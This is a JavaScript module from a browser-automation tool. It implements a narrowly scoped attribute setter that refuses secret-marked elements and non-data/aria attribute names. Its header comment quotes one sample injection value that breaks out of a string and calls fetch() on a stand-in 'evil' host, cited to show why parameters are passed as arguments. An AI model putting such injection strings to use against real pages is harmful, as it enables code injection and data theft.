/**
 * set_attr: a write-only, name/value-restricted attribute setter.
 *
 * Why this exists (obra#50 follow-up): the eval fail-closed guard added in
 * capture.js's evaluateWithCapture refuses EVERY eval call once a page has
 * any data-sen-secret element, because eval can read anything — there is
 * no way to tell a value-blind expression from one that would leak the
 * secret. That is correct for eval, but it collaterally blocked a
 * legitimate write: an agent entering a split-digit one-time code needs
 * to stamp a broker nonce onto an *unmarked* sibling digit-input element
 * right after capturing and marking the TOTP seed displayed on that same
 * now-marked page. set_attr is scoped narrowly enough —
 * no read capability at all, restricted target element, restricted
 * attribute names — that it doesn't need the secret-marker/eval guard:
 * there is nothing here for it to leak.
 *
 * NO caller-supplied JavaScript, unlike eval: selector/name/value travel
 * to the page as CDP Runtime.callFunctionOn `arguments` (CallArgument
 * values), never as text concatenated into a JS expression string. A
 * value like `"); fetch('https://evil'` cannot become code, because it is
 * never textually inserted into the function source — it only ever
 * arrives as a runtime string handed to setAttribute(). FUNCTION_DECLARATION
 * below is the entire, fixed, page-side source; it is written once here
 * and never built per call.
 *
 * Guards, defense in depth:
 *   - Attribute NAME: a default-deny ALLOWLIST (see isAllowedAttributeName),
 *     checked in Node before any CDP call at all — a disallowed name
 *     refuses without ever touching the page.
 *   - Target ELEMENT: the fixed page-side function refuses if the resolved
 *     element itself carries data-sen-secret, so this can never overwrite
 *     (or — since the marker name itself is on the deny list — strip) the
 *     marker off a secret element. This check is NOT gated behind the
 *     page-wide secret-marker check eval uses: set_attr can run freely on
 *     a page that has a marked element elsewhere, which is the entire
 *     point (see above).
 *   - Response shape: the page-side function returns only
 *     `{ ok: true }` or `{ ok: false, error }`, and the error strings are
 *     fixed literals we wrote (never page content, never the attribute's
 *     prior value, never the value just set).
 */
const { throwIfExceptionDetails } = require('./cdp-utils');

// Allowlist, not a denylist: only data-* (excluding the data-sen-secret
// marker itself) and aria-* names are writable. Both are pure metadata —
// never a URL the browser fetches, never executed, never wired to an
// event — which is what lets set_attr skip the secret-marker/eval guard
// entirely regardless of what value is written. Everything else is
// refused by default. That default-deny stance is deliberately what
// covers value/src/href/style/on* (and anything else not enumerated,
// including future HTML attributes nobody has thought to deny yet) — an
// allowlist only has to name what's safe, not chase every dangerous
// attribute there is or ever will be.
const DATA_ATTR = /^data-/i;
const ARIA_ATTR = /^aria-/i;
const MARKER_ATTR = 'data-sen-secret';

function isAllowedAttributeName(name) {
  if (typeof name !== 'string' || name === '') return false;
  if (name.toLowerCase() === MARKER_ATTR) return false;
  return DATA_ATTR.test(name) || ARIA_ATTR.test(name);
}

// Fixed page-side function body. selector/name/value are NEVER spliced
// into this string — see the module doc above — they arrive as
// Runtime.callFunctionOn `arguments` at call time.
const FUNCTION_DECLARATION = `function (selector, name, value) {
  var el = selector.charAt(0) === '/'
    ? document.evaluate(selector, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue
    : document.querySelector(selector);
  if (!el) return { ok: false, error: 'no element matched' };
  if (el.hasAttribute('data-sen-secret')) {
    return { ok: false, error: 'refused: target element is marked data-sen-secret' };
  }
  el.setAttribute(name, value);
  return { ok: true };
}`;

function attachSetAttribute({ getPageSession }) {
  async function setAttribute(tabIndexOrWsUrl, selector, name, value) {
    if (!isAllowedAttributeName(name)) {
      throw new Error(
        `set_attr refused: attribute name ${JSON.stringify(name)} is not allowed ` +
        '(only data-* and aria-* names, excluding data-sen-secret itself)'
      );
    }

    const ps = await getPageSession(tabIndexOrWsUrl);

    // Runtime.callFunctionOn needs an objectId or an executionContextId to
    // run against. `this` inside FUNCTION_DECLARATION is unused (selector/
    // name/value all arrive as arguments), so any live remote object works
    // as the call target; `document` is the simplest one that's always
    // present.
    const docResult = await ps.send('Runtime.evaluate', {
      expression: 'document',
      returnByValue: false,
    });
    throwIfExceptionDetails(docResult);

    const result = await ps.send('Runtime.callFunctionOn', {
      objectId: docResult.result.objectId,
      functionDeclaration: FUNCTION_DECLARATION,
      arguments: [{ value: selector }, { value: name }, { value: String(value) }],
      returnByValue: true,
    });
    throwIfExceptionDetails(result);

    const outcome = result.result.value;
    if (!outcome || outcome.ok !== true) {
      const reason = outcome && typeof outcome.error === 'string' ? outcome.error : 'unknown error';
      throw new Error(`set_attr refused: ${reason}`);
    }
  }

  return { setAttribute };
}

module.exports = { attachSetAttribute, isAllowedAttributeName, MARKER_ATTR };
